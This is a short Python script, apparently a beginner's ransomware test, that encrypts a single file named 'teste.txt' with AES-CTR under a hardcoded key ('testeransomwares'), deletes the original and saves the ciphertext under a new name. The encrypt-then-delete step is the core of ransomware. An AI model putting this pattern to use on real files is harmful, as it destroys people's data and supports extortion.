import pyaes
import os

file_name = "teste.txt"
with open(file_name, "rb") as file:
        file_data = file.read()




key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
encrypt_data = aes.encrypt(file_data)

os.remove(file_name)

with open("teste_troll.txt", "wb") as new_file:
        new_file.write(encrypt_data)


